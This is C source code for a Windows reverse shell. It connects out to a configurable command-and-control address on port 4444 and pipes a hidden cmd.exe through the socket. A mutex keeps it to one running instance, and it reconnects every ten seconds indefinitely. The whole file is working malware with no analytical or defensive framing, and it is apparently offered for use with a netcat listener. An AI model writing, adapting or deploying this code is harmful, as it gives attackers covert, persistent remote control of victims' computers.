#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

//your ip and port for nc
// ===== SETTINGS =====
#define C2_IP   "192.168.x.x"  
#define C2_PORT 4444
#define RETRY_DELAY_SEC 10     
// ====================

//network function
static int run_once(void) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in target;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int result = 1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    target.sin_family = AF_INET;
    target.sin_port   = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &target.sin_addr);

    //timeouts
    DWORD timeout = 5000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    if (WSAConnect(sock, (SOCKADDR *)&target, sizeof(target),
                   NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    //cmd path
    if (CreateProcessA(
            NULL,
            "C:\\Windows\\System32\\cmd.exe",
            NULL, NULL,
            TRUE,
            0,
            NULL,
            NULL,           
            &si, &pi)) {

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        result = 0;
    }

    closesocket(sock);
    WSACleanup();
    return result;
}

//winmain
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    //mutex
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RevShellInstance");
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;  
    }

    //workdirectory
    SetCurrentDirectoryA("C:\\");

    
    while (1) {
        run_once();
        Sleep(RETRY_DELAY_SEC * 1000);
    }

    CloseHandle(hMutex);
    return 0;
}


